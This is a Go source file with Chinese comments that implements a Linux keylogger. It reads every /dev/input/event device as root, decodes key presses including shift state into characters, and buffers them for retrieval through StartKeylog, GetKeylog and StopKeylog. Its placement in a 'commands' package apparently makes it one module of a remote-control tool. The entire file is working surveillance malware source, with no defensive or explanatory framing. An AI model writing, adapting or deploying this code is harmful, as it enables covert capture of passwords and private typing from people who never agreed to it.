//go:build linux

package commands

import (
	"encoding/binary"
	"fmt"
	"os"
	"sync"
)

// ===== 键盘记录（读取 /dev/input/event*，需 root 权限） =====

var (
	keylogBuf     []byte
	keylogMu      sync.Mutex
	keylogRunning bool
	keylogStopCh  chan struct{}
	keylogDevices []*os.File // K6: 已打开设备文件集合(Stop 时关闭以释放阻塞 Read)
	shiftPressed  bool
)

// linuxKeyCodes: Linux input event key code -> char
var linuxKeyMap = map[uint16]string{
	2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
	16: "Q", 17: "W", 18: "E", 19: "R", 20: "T", 21: "Y", 22: "U", 23: "I", 24: "O", 25: "P",
	30: "A", 31: "S", 32: "D", 33: "F", 34: "G", 35: "H", 36: "J", 37: "K", 38: "L",
	44: "Z", 45: "X", 46: "C", 47: "V", 48: "B", 49: "N", 50: "M",
	57: " ", 28: "\n", 15: "\t", 14: "[BACKSPACE]", 1: "[ESC]",
}

var linuxShiftMap = map[uint16]string{
	2: "!", 3: "@", 4: "#", 5: "$", 6: "%", 7: "^", 8: "&", 9: "*", 10: "(", 11: ")",
	16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
	30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k", 38: "l",
	44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
}

// StartKeylog 读取 /dev/input/event* 捕获按键（需 root）
func StartKeylog() error {
	keylogMu.Lock()
	if keylogRunning {
		keylogMu.Unlock()
		return nil
	}
	keylogBuf = nil
	keylogStopCh = make(chan struct{})
	keylogRunning = true
	keylogMu.Unlock()

	go keylogReadLoop()
	return nil
}

func keylogReadLoop() {
	defer func() {
		keylogMu.Lock()
		keylogRunning = false
		keylogMu.Unlock()
	}()

	// 尝试所有输入设备
	devices := []string{}
	for i := 0; i < 32; i++ {
		devices = append(devices, fmt.Sprintf("/dev/input/event%d", i))
	}

	for _, dev := range devices {
		go keylogReadDevice(dev)
	}
	// K6: 等待停止信号或全部设备退出（fd 关闭后 Read 返回错误 → goroutine 自然退出）
	<-keylogStopCh
}

func keylogReadDevice(dev string) {
	f, err := os.Open(dev)
	if err != nil {
		return
	}
	// K6: 注册打开的设备文件，Stop 时关闭使阻塞 Read 立即返回（消除 fd/goroutine 泄漏）
	keylogMu.Lock()
	keylogDevices = append(keylogDevices, f)
	keylogMu.Unlock()
	defer f.Close()
	defer func() {
		keylogMu.Lock()
		for i, fh := range keylogDevices {
			if fh == f {
				keylogDevices = append(keylogDevices[:i], keylogDevices[i+1:]...)
				break
			}
		}
		keylogMu.Unlock()
	}()

	buf := make([]byte, 24)
	for {
		select {
		case <-keylogStopCh:
			return
		default:
		}
		_, err := f.Read(buf)
		if err != nil {
			return
		}
		if len(buf) < 24 {
			continue
		}
		evType := binary.LittleEndian.Uint16(buf[16:18])
		code := binary.LittleEndian.Uint16(buf[18:20])
		value := int32(binary.LittleEndian.Uint32(buf[20:24]))

		if evType != 1 { // EV_KEY
			continue
		}
		switch code {
		case 42, 54: // shift
			shiftPressed = value == 1
			continue
		}
		if value != 1 { // 只记录按下
			continue
		}

		var ch string
		if shiftPressed {
			ch = linuxShiftMap[code]
		} else {
			ch = linuxKeyMap[code]
		}
		if ch != "" {
			keylogMu.Lock()
			keylogBuf = append(keylogBuf, []byte(ch)...)
			keylogMu.Unlock()
		}
	}
}

// GetKeylog 获取缓冲并清空
func GetKeylog() []byte {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	data := keylogBuf
	keylogBuf = nil
	return data
}

// StopKeylog 停止
func StopKeylog() error {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	if keylogRunning {
		select {
		case <-keylogStopCh:
		default:
			close(keylogStopCh)
		}
		// K6: 关闭全部设备文件，使阻塞中的 Read 返回错误 → goroutine 退出
		for _, f := range keylogDevices {
			f.Close()
		}
		keylogDevices = nil
		keylogRunning = false
	}
	return nil
}
